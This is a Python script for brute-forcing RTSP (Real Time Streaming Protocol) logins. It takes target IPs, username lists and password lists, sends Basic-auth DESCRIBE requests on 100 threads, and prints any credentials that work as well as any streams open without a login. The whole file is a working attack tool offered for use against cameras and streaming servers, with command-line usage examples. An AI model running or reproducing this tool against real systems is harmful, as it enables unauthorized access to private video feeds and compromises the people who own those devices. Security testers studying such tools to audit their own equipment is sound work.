# /usr/bin/python3

import base64
import socket
import threading
import fire
import re
import queue
import time
from pathlib import Path


class RtspBrute(object):
    """
    RtspBrute

    RtspBrute is a RTSP(Real Time Streaming Protocol) brute tool.

    Example:
        python3 oneforall.py -t 127.0.0.1  -u admin --password admin123  run
        python3 oneforall.py -t 127.0.0.1,127.0.0.2  -u ./username.txt --password admin123456 run
        python3 oneforall.py -t ./targets.txt  -u admin --password admin123 --port 555 run

    :param str target:      ip:port or file example:127.0.0.1:554 127.0.0.2:554 or ./targets.txt
    :param str username:    username or username file
    :param str password:    password or password file
    :param str port:        default port 554
    """

    def __init__(self, target, username, password, port=554):
        self.port = port
        self.targetlist = self.param_to_list(target, method='target')
        self.usernamelist = self.param_to_list(username)
        self.passwordlist = self.param_to_list(password)

    def run(self):
        print("There are %s targets" % len(self.targetlist))
        print("Use %s usernames" % len(self.usernamelist))
        print("Use %s passwords" % len(self.passwordlist))
        threads = 100
        global q
        q = queue.Queue()
        for _target in self.targetlist:
            q.put(_target)

        threads = min(len(self.targetlist), threads)
        print("Use %s threads" % threads)
        _threads = []
        for i in range(threads):
            t = threading.Thread(target=self.brute_force, args=())
            _threads.append(t)
        for t in _threads:
            t.setDaemon(True)
            t.start()
        for t in _threads:
            t.join()
        print("Finished all threads")

    def vaild_target(self, target):
        regex = re.compile(
            r"^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$")
        result = re.search(regex, target)
        if result:
            return result[0]
        else:
            return None

    def param_to_list(self, param, method=""):
        list = set()
        path = Path(param)
        if path.exists() and path.is_file():
            with open(path, encoding='utf-8', errors='ignore') as file:
                for line in file:
                    if method == "":
                        list.add(line.strip())
                    elif method == "target":
                        line = self.vaild_target(line.strip())
                        list.add(line.strip() + ":" + str(self.port))
            return list
        else:
            if method == "":
                list = param.split(',')
            elif method == "target":
                list = param.split(',')
                for i in range(len(list)):
                    list[i] = list[i]+':'+str(self.port)
            return list

    def rtsp_request(self, target, username="", password=""):
        if username:
            auth = username + ":" + password
            auth_base64 = base64.b64encode(auth.encode()).decode()
            req = "DESCRIBE rtsp://{} RTSP/1.0\r\nCSeq: 2\r\nAuthorization: Basic {}\r\n\r\n".format(target,
                                                                                                     auth_base64)
        else:
            req = "DESCRIBE rtsp://{} RTSP/1.0\r\nCSeq: 2\r\n\r\n".format(
                target)

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        try:
            s.connect((target.split(":")[0], int(target.split(":")[1])))
            s.sendall(req.encode())
            data = s.recv(1024).decode()
            return data

        except KeyboardInterrupt:
            # print("The run was interrupted by the user pressing Ctl-C")
            return
        except (socket.timeout, TimeoutError):
            # print("The test timed out trying to reach the IP provided. Check your IP and network and try again")
            return
        except (socket.error, OSError):
            # print("There is a networking problem. Please check your network and try again")
            return

    def brute_force(self):
        while not q.empty():
            target = q.get()
            # print(target)
            data = self.rtsp_request(target=target)
            if data:
                if "401 Unauthorized" in data:
                    # print("401 Unauthorized")
                    for username in self.usernamelist:
                        for password in self.passwordlist:
                            # print(password)
                            if "WWW-Authenticate: Basic" in data:
                                data = self.rtsp_request(
                                    target, username, password)
                                if "200 OK" in data:
                                    print(
                                        "{},{},{}".format(target, username, password))
                                    pass
                                if "401 Unauthorized" in data:
                                    time.sleep(1)
                                    # print("401 Unauthorized")
                                    continue
                    pass
                elif "200 OK" in data:
                    print(
                        "The RTSP service at: " + target + " allows unauthorized access and does not need a username/password")
                else:
                    pass
                    # print("Unkonwn problem from %s" % target)
                    # print(data)

            else:
                pass
        pass


if __name__ == '__main__':
    fire.Fire(RtspBrute)
